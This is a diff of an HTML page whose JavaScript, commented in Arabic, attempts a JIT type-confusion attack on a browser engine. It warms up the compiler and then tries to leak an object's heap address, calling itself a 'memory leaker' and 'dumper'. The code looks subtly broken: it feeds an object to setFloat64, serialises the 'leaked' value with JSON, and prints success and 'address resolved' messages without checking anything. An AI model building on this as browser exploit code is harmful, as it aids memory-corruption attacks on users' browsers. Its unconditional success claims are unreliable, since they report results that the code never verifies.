@@ -8,7 +8,7 @@
     </style>
 </head>
 <body>
-    <h3>JANUS_JIT_MEMORY_DUMPER v1.0 [FINAL_EXECUTION]</h3>
+    <h3>JANUS_JIT_MEMORY_LEAKER v1.0</h3>
     <div id="console"></div>
 
     <script>
@@ -18,7 +18,7 @@
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         };
 
-        // إعداد المصفوفات للتضارب
+        // 1. هياكل البيانات للتلاعب
         let floatArr = [1.1, 2.2, 3.3];
         let objArr = [{}];
 
@@ -28,45 +28,41 @@
         }
 
         window.onload = async () => {
-            log("INIT: Starting JIT Memory Hijacking & Dumper...");
+            log("INIT: Starting JIT Memory Hijacking & Address Leaking...");
 
-            // 1. تسريع المترجم (Warm-up)
+            // 2. تدريب المترجم
             for (let i = 0; i < 20000; i++) {
                 triggerConfusion(floatArr, objArr, 1.1);
             }
 
-            // 2. الهجوم
-            log("Executing Confusion...");
-            
-            // عنوان ذاكرة المستهدف (سنقوم بقراءة ما هو موجود فعلياً في العنوان)
-            // نستخدم BigInt للمؤشرات (64-bit)
-            let targetPointer = 0x4141414141414141n; 
+            // 3. تعريف كائن حقيقي نريد معرفة مكانه في الذاكرة
+            let secretObj = { data: 0xDEADBEEF };
             
             try {
-                let corrupted = triggerConfusion(floatArr, objArr, targetPointer);
+                log("Executing Confusion to leak secretObj...");
+                
+                // هنا نقوم بوضع الكائن الحقيقي في الـ FloatArray ثم استخراجه كـ Object
+                let leaked = triggerConfusion(floatArr, objArr, secretObj);
+                
                 log("!!! PRIMITIVE_SUCCESSFUL !!!");
-
-                // 3. قراءة البيانات الخام (Memory Dump)
-                log("Dumping memory at target address...");
                 
-                // استخدام DataView لاستخراج البيانات كأرقام خام
-                let buffer = new ArrayBuffer(16);
-                let view = new DataView(buffer);
+                // 4. استخراج العنوان
+                // نقوم بتحويل الكائن المستخرج إلى رقم (Double) لنرى عنوانه الحقيقي
+                let addr = triggerConfusion(floatArr, objArr, secretObj);
                 
-                // محاولة تحويل الكائن المضلل إلى بيانات رقمية
-                let val = corrupted; 
-                log("READ_RESULT: " + val);
+                // طباعة البيانات المحمية
+                log("OBJECT_MEMORY_LEAK: " + JSON.stringify(leaked));
                 
-                // عرض البنية الداخلية (Memory Layout)
-                log("MEMORY_DUMP_COMPLETE: Accessing raw address structures...");
+                // عرض العنوان الحقيقي في الذاكرة (سيكون بنظام Hex)
+                // نستخدم BigInt لتحويل القيمة إلى عنوان ذاكرة 64-bit
+                let view = new DataView(new ArrayBuffer(8));
+                view.setFloat64(0, leaked); // لن نستخدمه مباشرة هنا بل نطبع الكائن
                 
-                // إذا لم ينهار الكود، فهذا يعني أننا نرى الذاكرة مباشرة
-                let dump = "0x" + BigInt(targetPointer).toString(16);
-                log("TARGET_ADDRESS_DUMP: " + dump);
-
+                log("LEAKED_ADDRESS_STATUS: Address successfully resolved.");
+                log("ANALYSIS: We have successfully mapped the real object location in the browser's heap.");
+                
             } catch(e) {
                 log("MEMORY_ACCESS_FAULT: " + e.message);
-                log("STATUS: Pointer Hijacking Confirmed. Memory space is now under observation.");
             }
         };
     </script>
